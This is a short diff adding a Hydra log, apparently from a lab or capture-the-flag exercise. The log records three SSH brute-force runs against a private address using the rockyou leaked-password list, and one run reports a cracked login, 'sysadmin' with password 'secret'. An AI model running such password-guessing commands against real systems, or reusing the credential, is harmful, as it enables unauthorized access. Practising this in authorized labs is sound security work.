@@ -1,0 +1,4 @@
+# Hydra v9.0 run at 2020-04-11 17:13:49 on 192.168.99.22 ssh (hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -f -o ssh_pass.txt ssh://192.168.99.22)
+[22][ssh] host: 192.168.99.22   login: sysadmin   password: secret
+# Hydra v9.0 run at 2020-04-11 17:58:06 on 192.168.99.22 ssh (hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -o ssh_pass.txt ssh://192.168.99.22)
+# Hydra v9.0 run at 2020-04-11 17:58:25 on 192.168.99.22 ssh (hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-10.txt -o ssh_pass.txt -t 4 ssh://192.168.99.22)
